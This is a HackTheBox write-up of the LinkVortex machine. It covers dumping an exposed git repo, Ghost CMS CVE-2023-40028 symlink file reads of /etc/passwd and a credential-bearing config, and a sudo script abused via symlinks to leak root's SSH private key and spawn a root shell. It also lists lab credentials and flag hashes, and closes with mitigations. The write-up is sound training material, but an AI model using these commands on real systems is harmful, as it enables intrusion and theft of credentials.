# LinkVortex — HackTheBox Writeup

**Machine IP**: `10.10.11.47`
**Author**: Mridul Chamoli
**Difficulty**: Easy
**Category**: Linux | Web | Privilege Escalation

---

## Hello world!

Another HackTheBox machine has retired and today we’re going to talk about it.

Welcome to another moment in my journey into the world of cybersecurity! This time it’s the **LinkVortex** machine, which is classified as **easy**.

On this machine we have a **Ghost CMS** vulnerable to a path traversal using symlink. After finding an exposed git repository, we found the site admin credentials among the files. As the admin, we can take advantage of **CVE-2023-40028 — Ghost Arbitrary File Read**. Reading one of Ghost's sensitive files, we find the SSH credentials of user **bob**. As `bob`, we can run a script with root privileges that can be exploited via symlink to obtain the root SSH key and get root.

This is going to be a lot of fun and educational, so let’s get started.

---

## 🔍 Enumeration

### Port Scanning

I started with an nmap port scan to discover services:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -Pn -p$ports -sC -sV -oA nmap/$machine -vv $IP
```

**nmap results (relevant ports)**:

```
22/tcp open  ssh    OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http   Apache httpd
```

Since I didn't have SSH credentials initially, I focused on the web service (port 80).

### Website reconnaissance

The web server hosted a site called **BitByBit Hardware**. Viewing the page source and headers showed this is running **Ghost CMS v5.58**. The site had an **ABOUT** page and a `/ghost/` endpoint which redirected to the Ghost admin.

I enumerated further:

* Used `ffuf` to look for subdomains and discovered `dev.linkvortex.htb`.
* Added `dev.linkvortex.htb` to `/etc/hosts` and inspected the dev site.

Using `ffuf` I discovered an exposed **`.git`** repository on the dev subdomain:

```
.git/config             [Status: 200]
.git/HEAD               [Status: 200]
.git/index              [Status: 200]
...
```

I dumped the repo using `git-dumper`:

```bash
git-dumper http://dev.linkvortex.htb/.git ./dumped
```

Inside the dumped repository I searched for potential credentials and interesting changes. Running `git status` and `git diff` revealed a modified test file that included a changed password:

```diff
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
```

The default `thisissupersafe` was replaced by `OctopiFociPilfer45` — a likely admin password. The Dockerfile in the dump also revealed the path to the Ghost `config.production.json` file on the server: `/var/lib/ghost/config.production.json`.

Next, I enumerated the main domain to find the Ghost admin login and helpful files like `robots.txt` and `sitemap.xml` which hinted at the admin user.

---

## 🛠️ Exploitation — CVE-2023-40028 (Ghost Arbitrary File Read)

Ghost v5.58 is vulnerable to **CVE-2023-40028**, an arbitrary file read via symlink inside uploaded ZIPs. The exploitation flow is:

1. Authenticate to Ghost admin to get a session cookie.
2. Upload a crafted ZIP containing a symlink in the content images folder that points to a sensitive file (e.g. `/var/lib/ghost/config.production.json`).
3. Access the uploaded symlinked image path to receive the sensitive file contents.

I used an existing exploit script (simplified) that:

* Creates a temp payload directory
* Adds a symlink named `*.png` pointing to the target file under `content/images/2024/`
* Zips the folder preserving symlinks
* Uploads via Ghost admin API endpoint `/ghost/api/v3/admin/db`
* Fetches the uploaded image path to print the file contents

Example usage (after filling in URL and admin creds):

```bash
bash CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
```

A quick test reading `/etc/passwd` returned expected contents, confirming the exploit worked.

### Reading the Ghost config

Using the exploit I read `/var/lib/ghost/config.production.json` and obtained the SMTP credentials:

```json
{
  "mail": {
    "options": {
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
      }
    }
  }
}
```

Armed with these credentials, I SSH'd into the box as `bob`.

```bash
ssh bob@linkvortex.htb
# password: fibber-talented-worth
cat user.txt
# 0402838a9be288cc226d41135b2b1116
```

User flag captured.

---

## ⬆️ Privilege Escalation — abusing `clean_symlink.sh`

On `bob` I checked sudo privileges:

```bash
sudo -l
```

Output showed:

```
(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

The script `/opt/ghost/clean_symlink.sh` is installed as follows:

```bash
#!/bin/bash
QUAR_DIR="/var/quarantined"
if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi
LINK=$1
if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

This script moves symlinked PNGs to a quarantine directory. If the environment variable `CHECK_CONTENT` evaluates to true, it prints the file contents.

### Exploit: leak root SSH private key

The script checks whether the target of the symlink contains `etc` or `root`; if it doesn't, it treats it as safe and moves it to quarantine — and optionally prints the contents. We can abuse this behavior to leak files that **do not contain** `etc` or `root` in their path by using intermediate symlinks.

Attack steps performed as `bob`:

```bash
# create a symlink pointing to root's private key
ln -s /root/.ssh/id_rsa p.txt
# create a symlink named preacher.png that points to p.txt
ln -s p.txt preacher.png
# run the privileged script with CHECK_CONTENT=true
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/preacher.png
```

The script moved the symlink to quarantine and, because `CHECK_CONTENT=true`, printed the contents — revealing the **root** private key.

I saved the leaked private key locally (set permissions to 600) and SSH'd as root with it:

```bash
ssh -i link-id_rsa root@linkvortex.htb
# root@linkvortex:~# cat root.txt
# f80b952dd37c2fe8416352d50b5ad6ca
```

Root flag captured.

---

## 🧠 Key Takeaways

| Phase                 | Technique                                                                                                       |
| --------------------- | --------------------------------------------------------------------------------------------------------------- |
| Enumeration           | nmap, ffuf, git-dumper, source inspection                                                                       |
| Initial Foothold      | Ghost RCE/Arbitrary File Read (CVE-2023-40028) via symlinked ZIP upload                                         |
| Credential Harvesting | Read `/var/lib/ghost/config.production.json` to get bob's SSH creds                                             |
| Privilege Escalation  | sudoable script `/opt/ghost/clean_symlink.sh` abused with symlinks and `CHECK_CONTENT` to leak root private key |

---

## 🔐 Mitigations & Notes

* **Patch Ghost**: Upgrade Ghost to the patched version (>= 5.59.1) which fixes symlink handling in ZIP uploads.
* **Harden file upload processing**: Ensure archive extraction libraries do not follow or allow symlinks, and validate uploaded archive contents strictly.
* **Least privilege**: Avoid giving users NOPASSWD sudo rights to scripts that process user-controlled files. Require strict path validation and sanitize inputs.
* **Secure scripts**: Don’t evaluate variables directly in conditions (e.g. `if $CHECK_CONTENT; then` is dangerous). Use explicit checks like `if [ "$CHECK_CONTENT" = "true" ]`.
* **Protect secret files**: Restrict access to private keys and sensitive config files and enforce strict file permissions.

---

## Beyond Root

There was an additional note: the `clean_symlink.sh` script is also vulnerable to command injection-like behavior because `if $CHECK_CONTENT; then` will execute the value of `CHECK_CONTENT` if it's not a boolean literal. By setting `CHECK_CONTENT=bash` and running the script via sudo, you can get an interactive root shell directly.

Example:

```bash
ln -s preacher.png a.png
CHECK_CONTENT=bash sudo bash /opt/ghost/clean_symlink.sh preacher.png
# results in root shell
```

This shows the importance of never executing user-controlled variables as commands.

---

## Directory used

```
/home/thanatos/Desktop/htb/machines/linkvortex
```

---

## Flags

* `user.txt` – `0402838a9be288cc226d41135b2b1116`
* `root.txt` – `f80b952dd37c2fe8416352d50b5ad6ca`

---

### Final words

Nice and clean box that demonstrates a realistic chain: sensitive data disclosure through misconfigured webapp uploads → credential reuse → abusing a sudo script that handles user files. Always treat uploaded archives and symlinks with suspicion, and avoid granting scripts broad sudo access.

**Terminal**: `thanatos@kali:/home/thanatos/Desktop/htb/machines/linkvortex`

*Happy hacking!*
